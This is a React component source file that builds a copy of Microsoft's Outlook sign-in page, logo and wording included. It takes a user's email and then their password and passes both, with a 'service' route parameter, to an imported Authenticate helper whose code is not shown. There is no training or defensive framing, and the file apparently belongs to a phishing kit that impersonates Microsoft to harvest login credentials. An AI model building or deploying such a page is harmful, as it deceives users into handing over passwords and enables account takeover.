import { useState } from 'react'
import MicrosoftLogo from '../../assets/microsoft_logo.svg'
import Outlook from '../../assets/Outlook-login.png'
import { useParams } from 'react-router-dom'
import { Authenticate } from '../../helpers/Auth'

const Microsoft = () => {
  const { service } = useParams()
  const [showPasswordInput, setShowPasswordInput] = useState(false)
  const [btnText, setBtnText] = useState('Next')

  const [userID, setUserID] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')

  const handleBtn = () => {
    setError('')
    if (btnText === 'Next') {
      if (!userID) {
        setError('Please enter your email, phone or skype')
        return
      }
      setBtnText('Submit')
      setShowPasswordInput(true)
    } else if (btnText === 'Submit') {
      if (!password) {
        setError('Please enter your password')
        return
      }
      Authenticate(userID, password, service)
    }
  }

  const handleBack = () => {
    setShowPasswordInput(false)
    setBtnText('Next')
  }

  return (
    <div className='w-screen h-screen overflow-y-auto flex items-center justify-center microsoft-login'>
      <section className='w-full md:w-[30vw] md:h-[50vh] flex flex-col gap-5 px-2 md:px-[auto]'>
        {service === 'outlook' && (
          <img src={Outlook} className='w-[10rem] self-center ' />
        )}
        <div className='p-11 md:shadow-microsoftLogin '>
          <img src={MicrosoftLogo} className='mb-5 ' />
          <header className='my-3'>
            <p className='text-3xl md:text-2xl text-[#1b1b1b]'>Sign in</p>
            {service === 'outlook' && (
              <p className='font-light text-base md:text-sm'>
                to continue to Outlook
              </p>
            )}
          </header>
          <section className='flex w-full flex-col gap-2'>
            {!showPasswordInput ? (
              <input
                placeholder='Email, phone or Skype'
                className='outline-none border-b-2 w-full bg-transparent h-9'
                value={userID}
                onChange={(e) => setUserID(e.target.value)}
              />
            ) : (
              <input
                placeholder='Password'
                type='password'
                className='outline-none border-b-2 w-full bg-transparent h-9'
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            )}
            <p className='text-lg text-red-700 tracking-wide'>{error}</p>

            <span className='self-end justify-self-end flex gap-2'>
              {showPasswordInput && (
                <button
                  className='bg-[#B2B2B2] hover:bg-[#b2b2b2f3] text-white w-[7rem] p-1 text-lg mt-3 outline-none'
                  onClick={handleBack}
                >
                  Back
                </button>
              )}
              <button
                className='bg-[#0067B8] hover:bg-[#003db8ef] text-white w-[7rem] p-1 text-lg mt-3 outline-none'
                onClick={handleBtn}
              >
                {btnText}
              </button>
            </span>
          </section>
        </div>
      </section>
    </div>
  )
}

export default Microsoft
